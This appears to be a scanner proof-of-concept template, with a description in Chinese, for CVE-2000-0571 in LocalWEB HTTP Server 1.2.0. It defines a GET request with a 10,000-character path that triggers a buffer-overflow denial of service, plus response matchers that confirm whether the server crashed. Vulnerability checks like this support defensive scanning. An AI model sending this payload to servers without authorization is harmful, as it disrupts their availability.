[info]
author = "ave"
description = "向LocalWEB HTTP Server 1.2.0发送超长GET请求（10000个A字符），验证是否存在缓冲区溢出导致拒绝服务漏洞。Exploit-DB已公开利用代码（EDB-ID:20054），由Ussr Labs发布。"
id = "POC-AVE-2000-0455"
name = "West Street Software LocalWEB HTTP Server 1.2.0 长GET请求缓冲区溢出拒绝服务漏洞 PoC"
severity = "medium"
tags = ["cve-2000-0571"]
vuln_id = [
    "CVE-2000-0571",
    "AVE-2000-0455",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = '/{{repeat("A", 10000)}}'
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Service Unavailable",
    "Connection refused",
    "500",
]
